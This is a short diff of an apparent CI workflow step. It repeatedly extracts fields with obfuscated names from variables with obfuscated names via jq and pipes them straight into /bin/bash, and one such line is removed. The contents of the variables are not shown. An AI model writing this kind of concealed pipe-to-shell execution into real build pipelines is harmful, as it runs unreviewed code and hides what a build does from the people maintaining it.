@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$w5" | jq -r .fcwo0235 | /bin/bash
           echo $rhmx10 | jq -r .g7 | /bin/bash
-          echo $lgau3 | jq -r .cmb4684 | /bin/bash
           printf '%s' "$tndho63681" | jq -r .nctys3 | /bin/bash
           echo $diw48445 | jq -r .d40 | /bin/bash
           echo $mmnzo2 | jq -r .x5812 | /bin/bash
